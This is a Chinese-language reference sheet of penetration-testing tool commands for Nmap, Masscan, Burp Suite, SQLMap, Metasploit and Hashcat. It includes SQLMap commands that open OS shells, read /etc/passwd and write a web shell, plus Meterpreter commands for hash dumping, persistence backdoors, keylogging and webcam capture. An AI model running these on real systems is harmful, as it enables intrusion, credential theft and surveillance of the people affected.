## 一、信息收集工具

### 1.1 Nmap - 网络扫描器

**简介**：最流行的端口扫描和网络发现工具

**常用命令**：

```bash
# 基础扫描
nmap 192.168.1.1              # 扫描单个 IP
nmap 192.168.1.1-100          # 扫描 IP 范围
nmap 192.168.1.0/24           # 扫描 C 段
nmap target.com               # 扫描域名

# 端口扫描
nmap -p 80,443 192.168.1.1    # 扫描指定端口
nmap -p- 192.168.1.1          # 扫描全端口（1-65535）
nmap -p 1-1000 192.168.1.1    # 扫描指定范围端口
nmap --top-ports 100 192.168.1.1  # 扫描最常用的 100 个端口

# 扫描方式
nmap -sT 192.168.1.1          # TCP 全连接扫描（最准确，慢）
nmap -sS 192.168.1.1          # SYN 半开扫描（快，需要 root）
nmap -sU 192.168.1.1          # UDP 扫描（慢）
nmap -sP 192.168.1.0/24       # Ping 扫描（存活主机探测）

# 服务和版本探测
nmap -sV 192.168.1.1          # 探测服务版本
nmap -sV --version-intensity 5 192.168.1.1  # 版本探测强度（0-9）

# 操作系统探测
nmap -O 192.168.1.1           # 探测操作系统
nmap -O --osscan-guess 192.168.1.1  # 猜测操作系统

# 脚本扫描
nmap --script=vuln 192.168.1.1     # 漏洞扫描脚本
nmap --script=auth 192.168.1.1     # 认证绕过脚本
nmap --script=brute 192.168.1.1    # 暴力破解脚本
nmap --script=default 192.168.1.1  # 默认脚本集

# 其他常用参数
nmap -v 192.168.1.1          # 详细输出
nmap -vv 192.168.1.1         # 更详细输出
nmap -T4 192.168.1.1         # 扫描速度（0-5，T4 常用）
nmap -Pn 192.168.1.1         # 不 Ping，直接扫描（禁 Ping 时用）
nmap -n 192.168.1.1          # 不做 DNS 解析（更快）
nmap -oN result.txt 192.168.1.1  # 输出到文件
nmap -oX result.xml 192.168.1.1  # 输出 XML 格式
```

**使用场景**：
- 端口扫描和服务识别
- 存活主机探测
- 操作系统识别
- 漏洞扫描（配合脚本）

**技巧**：
- 内网扫描用 -T4，外网扫描用 -T3 或 -T2
- 目标禁 Ping 时一定要加 -Pn
- 大网段先做 Ping 扫描（-sP），再对存活主机详细扫

### 1.2 Masscan - 高速端口扫描器

**简介**：号称最快的端口扫描器，能在几分钟内扫完全互联网

**常用命令**：

```bash
# 基础扫描
masscan 192.168.1.0/24 -p80,443    # 扫描指定端口
masscan 192.168.1.0/24 -p1-65535   # 扫描全端口

# 速度控制
masscan 192.168.1.0/24 -p80 --rate=1000    # 每秒 1000 包
masscan 192.168.1.0/24 -p80 --rate=100000  # 每秒 10 万包（高速）

# 输出
masscan 192.168.1.0/24 -p80 -oJ result.json  # JSON 格式输出
masscan 192.168.1.0/24 -p80 -oL result.txt   # 列表格式输出

# 其他
masscan -iL ip_list.txt -p80        # 从文件读取 IP 列表
masscan 192.168.1.0/24 -p80 --banners  # 获取 Banner 信息
```

**使用场景**：
- 大范围端口扫描
- 全网段快速探测
- 资产发现

**注意**：
- 速度太快可能被封 IP，内网用没问题
- 外网扫描要控制速率
- 结果可能有漏报，建议用 Nmap 验证

## 二、Web 渗透工具

### 2.1 Burp Suite - Web 渗透神器

**简介**：Web 渗透测试必备工具，功能强大

**主要模块**：

| 模块 | 功能 |
|------|------|
| Proxy | 代理服务器，抓包改包 |
| Repeater | 重放请求，手动测试 |
| Intruder | 自动化爆破（密码、目录、参数等） |
| Decoder | 编码解码 |
| Comparer | 对比两个请求/响应 |
| Sequencer | 随机性测试 |
| Scanner | 漏洞扫描（专业版） |
| Extender | 插件管理 |

**常用技巧**：

**Proxy 模块**：
- Fwd：转发数据包
- Drop：丢弃数据包
- Intercept is on/off：开启/关闭拦截
- Action → Send to Repeater/Intruder：发送到其他模块

**Repeater 模块**：
- Ctrl+R：发送请求
- Ctrl+Shift+R：重发请求
- 可以修改请求的任何部分
- 左右对比请求和响应

**Intruder 模块**：
- 攻击模式：
  - Sniper：单字典，逐个替换标记位
  - Battering ram：单字典，同时替换所有标记位
  - Pitchfork：多字典，一一对应
  - Cluster bomb：多字典，笛卡尔积
- Payload 位置：用 § 标记
- Payload 设置：字典、前缀后缀、编码等

**常用快捷键**：
- Ctrl+Shift+P：Proxy 开关
- Ctrl+R：发送请求（Repeater）
- Ctrl+I：发送到 Intruder
- Ctrl+D：发送到 Decoder

**常用插件**：
- SQLiPy：SQL 注入扫描
- XSS Validator：XSS 检测
- WAF Detector：WAF 检测
- JS-Scanner：JS 安全扫描
- Param Miner：参数发现
- HackBar：类似浏览器 HackBar
- Active Scan++：增强主动扫描

### 2.2 SQLMap - SQL 注入神器

**简介**：自动化 SQL 注入工具，功能极其强大

**常用命令**：

```bash
# 基础检测
sqlmap -u "http://example.com/page?id=1"     # 检测 GET 参数
sqlmap -u "http://example.com/login" --data="user=admin&pass=123"  # POST 参数
sqlmap -r request.txt                         # 从文件读取请求（Burp 导出）

# 指定数据库和表
sqlmap -u "http://example.com/page?id=1" --dbs       # 爆数据库
sqlmap -u "http://example.com/page?id=1" -D db_name --tables   # 爆表
sqlmap -u "http://example.com/page?id=1" -D db_name -T table --columns  # 爆字段
sqlmap -u "http://example.com/page?id=1" -D db_name -T table -C "user,pass" --dump  # 爆数据

# 快速获取数据
sqlmap -u "http://example.com/page?id=1" --dump      # 导出所有数据
sqlmap -u "http://example.com/page?id=1" --dump-all  # 导出所有数据库数据

# 提权和执行命令
sqlmap -u "http://example.com/page?id=1" --os-shell  # 获取系统 Shell
sqlmap -u "http://example.com/page?id=1" --os-cmd "whoami"  # 执行系统命令
sqlmap -u "http://example.com/page?id=1" --sql-shell # 获取 SQL Shell

# 读写文件
sqlmap -u "http://example.com/page?id=1" --file-read "/etc/passwd"   # 读文件
sqlmap -u "http://example.com/page?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"  # 写文件

# 指定注入类型和参数
sqlmap -u "http://example.com/page?id=1" -p id            # 指定参数
sqlmap -u "http://example.com/page?id=1" --technique=U    # 指定注入类型（U=联合查询）
sqlmap -u "http://example.com/page?id=1" --dbms=mysql     # 指定数据库类型
sqlmap -u "http://example.com/page?id=1" --level=3        # 测试等级（1-5）
sqlmap -u "http://example.com/page?id=1" --risk=3         # 风险等级（1-3）

# 绕过 WAF
sqlmap -u "http://example.com/page?id=1" --tamper=space2comment   # 空格转注释
sqlmap -u "http://example.com/page?id=1" --tamper=charencode      # URL 编码
sqlmap -u "http://example.com/page?id=1" --tamper=base64encode    # Base64 编码
sqlmap -u "http://example.com/page?id=1" --tamper=apostrophemask  # 单引号转 UTF-8
sqlmap -u "http://example.com/page?id=1" --tamper=space2hash      # 空格转 #

# 多个 tamper 一起用
sqlmap -u "http://example.com/page?id=1" --tamper=space2comment,charencode,base64encode

# 其他常用参数
sqlmap -u "http://example.com/page?id=1" --batch       # 非交互模式，全部默认
sqlmap -u "http://example.com/page?id=1" --threads 10  # 线程数
sqlmap -u "http://example.com/page?id=1" -v 3          # 详细程度（0-6）
sqlmap -u "http://example.com/page?id=1" --random-agent # 随机 UA
sqlmap -u "http://example.com/page?id=1" --proxy "http://127.0.0.1:8080"  # 代理
sqlmap -u "http://example.com/page?id=1" --delay 1     # 请求延迟（秒）
sqlmap -u "http://example.com/page?id=1" --timeout 10  # 超时时间（秒）
```

**注入类型说明**：
- B：Boolean-based blind（布尔盲注）
- E：Error-based（报错注入）
- U：Union query（联合查询）
- S：Stacked queries（堆叠查询）
- T：Time-based blind（时间盲注）
- Q：Inline queries（内联查询）

**使用技巧**：
- 不确定注入点时，用 Burp 抓包后 -r 导入
- 注入慢时可以加 --threads 提高线程
- WAF 绕过先试几个常见的 tamper
- 数据量大时用 --dump 加 -T -C 指定表和字段
- --batch 可以自动回答所有问题，适合跑批

## 四、内网渗透工具

### 4.1 Metasploit Framework (MSF)

**简介**：最流行的渗透测试框架，功能极其强大

**基本使用**：

```bash
# 启动 MSF
msfconsole

# 常用命令
help                    # 帮助
search ms17_010        # 搜索模块
use exploit/windows/smb/ms17_010_eternalblue  # 使用模块
info                    # 查看模块信息
show options            # 查看参数
set RHOSTS 192.168.1.1  # 设置参数
set PAYLOAD windows/meterpreter/reverse_tcp  # 设置 Payload
run / exploit           # 执行
```

**常用模块类型**：

| 类型 | 说明 |
|------|------|
| exploit | 漏洞利用模块 |
| payload | 攻击载荷 |
| auxiliary | 辅助模块（扫描、爆破等） |
| post | 后渗透模块 |
| encoder | 编码模块（免杀） |
| nop | NOP 生成器 |

**Meterpreter 常用命令**：

```bash
# 基础命令
help                # 帮助
sysinfo             # 系统信息
ipconfig / ifconfig # 网络信息
getuid              # 当前用户
getsystem           # 尝试提权
ps                  # 进程列表
kill <pid>          # 杀死进程

# 文件操作
ls                  # 列出文件
cd                  # 切换目录
pwd                 # 当前目录
cat <file>          # 查看文件
upload <local> <remote>  # 上传文件
download <remote> <local> # 下载文件
edit <file>         # 编辑文件
rm <file>           # 删除文件
mkdir <dir>         # 创建目录

# 网络操作
portfwd add -l 3389 -p 3389 -r 192.168.1.10  # 端口转发
route add 192.168.1.0 255.255.255.0  # 添加路由
arp                 # ARP 表
netstat             # 网络连接

# 凭证获取
hashdump            # 导出 Hash
mimikatz            # 加载 mimikatz
kiwi                # 新版 mimikatz

# 权限维持
persistence         # 安装持久化后门
run getgui -e       # 开启 3389
run getgui -u user -p pass  # 添加用户

# 其他
screenshot          # 截图
webcam_list         # 摄像头列表
webcam_snap         # 拍照
keyscan_start       # 键盘记录开始
keyscan_dump        # 导出键盘记录
keyscan_stop        # 键盘记录停止
background          # 后台运行
sessions -l         # 列出会话
sessions -i <id>    # 进入会话
```

**常用 Payload**：

```
windows/meterpreter/reverse_tcp      # Windows 反向 TCP
windows/meterpreter/bind_tcp         # Windows 正向 TCP
windows/meterpreter/reverse_http     # Windows 反向 HTTP
windows/meterpreter/reverse_https    # Windows 反向 HTTPS
linux/x86/meterpreter/reverse_tcp    # Linux 反向 TCP
php/meterpreter/reverse_tcp          # PHP 反向 TCP
java/jsp_shell_reverse_tcp           # JSP 反向 TCP
```

**使用技巧**：
- 先 search 找模块，再 use 使用
- show options 看需要设置什么参数
- set 设置参数，unset 取消设置
- 拿到 Shell 后先 getuid 看权限
- 权限不够就 getsystem 或找提权漏洞
- background 后台运行，sessions 管理会话

### 4.2 Cobalt Strike (CS)

**简介**：商业级渗透测试框架，红队必备

**特点**：
- 功能强大，团队协作
- Beacon Payload 免杀效果好

## 五、密码破解工具

### 5.1 Hashcat

**简介**：世界上最快的密码恢复工具

**常用命令**：

```bash
# 基础破解
hashcat -m 0 hash.txt wordlist.txt    # MD5 破解
hashcat -m 100 hash.txt wordlist.txt  # SHA1 破解
hashcat -m 500 hash.txt wordlist.txt  # NTLM 破解

# 常用哈希类型
-m 0     # MD5
-m 100   # SHA1
-m 500   # NTLM
-m 1000  # NTLMv2
-m 1800  # SHA-512(Unix)
-m 3200  # bcrypt
-m 13100 # Kerberos 5 TGS-REP (Kerberoast)
-m 18200 # Kerberos 5 AS-REP (AS-REP Roasting)
-m 2500  # WPA/WPA2

# 攻击模式
-a 0  # 字典攻击（Straight）
-a 1  # 组合攻击（Combination）
-a 3  # 掩码攻击（Brute-force）
-a 6  # 字典+掩码（Hybrid Wordlist + Mask）
-a 7  # 掩码+字典（Hybrid Mask + Wordlist）

# 掩码攻击
hashcat -m 0 -a 3 hash.txt ?d?d?d?d?d?d  # 6位数字
hashcat -m 0 -a 3 hash.txt ?l?l?l?l?l?l  # 6位小写字母
hashcat -m 0 -a 3 hash.txt ?u?l?l?l?l?d?d?d  # 首字母大写+数字

# 掩码字符说明
?l = abcdefghijklmnopqrstuvwxyz    # 小写字母
?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ    # 大写字母
?d = 0123456789                    # 数字
?s =  !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~  # 特殊字符
?a = ?l?u?d?s                      # 所有字符
?b = 0x00 - 0xff                   # 所有字节

# 其他常用参数
-o result.txt    # 输出结果
--show           # 显示已破解的
--force          # 强制运行（跳过警告）
--status         # 显示状态
--runtime=3600   # 运行时间（秒）
-w 3             # 工作负载（1-4，3 是默认）
```

**使用技巧**：
- 先跑字典，再跑掩码
- 字典越大越好，优先用泄露的密码字典
- 掩码要根据目标密码策略来定
- 用 GPU 比 CPU 快很多
- --show 可以随时查看已破解的

## 💡 工具使用建议

1. **工具只是工具，思路更重要**：
   - 工具是辅助的，关键是你的思路
   - 不要只会用工具，要理解原理
   - 同一个工具，不同的人用效果完全不同

2. **精通几个核心工具**：
   - 不要什么工具都只会一点
   - 把 Burp、SQLMap、MSF 这几个核心工具用精通
   - 其他工具了解就行，需要时再学

3. **多关注新工具**：
   - 安全工具更新很快
   - 多关注 GitHub、安全社区
   - 好的工具能事半功倍

4. **自己造轮子**：
   - 有能力的话，自己写工具
   - 写工具的过程也是学习的过程
   - 自己的工具用着最顺手
